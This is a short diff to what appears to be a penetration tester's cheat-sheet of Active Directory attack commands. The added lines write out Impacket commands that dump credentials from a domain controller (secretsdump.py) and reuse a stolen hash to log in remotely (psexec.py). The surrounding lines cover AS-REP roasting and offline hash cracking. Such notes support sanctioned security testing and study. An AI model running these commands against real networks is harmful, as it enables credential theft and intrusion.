@@ -64,3 +64,9 @@ https://nmap.org/nsedoc/scripts/nfs-showmount.html
 # Enum AD
 GetNPUsers.py -usersfile <user_list> -dc-ip <dc-ip> <domain>/
 Afterwards crack with john or oclhashcat
+
+# Dumps Cred from DC
+secretsdump.py "<domain>/<user>:<pwd>"@<target-host>
+  
+# Use Hash to access pc
+psexec.py -hashes <hash> <user>@<target-host>
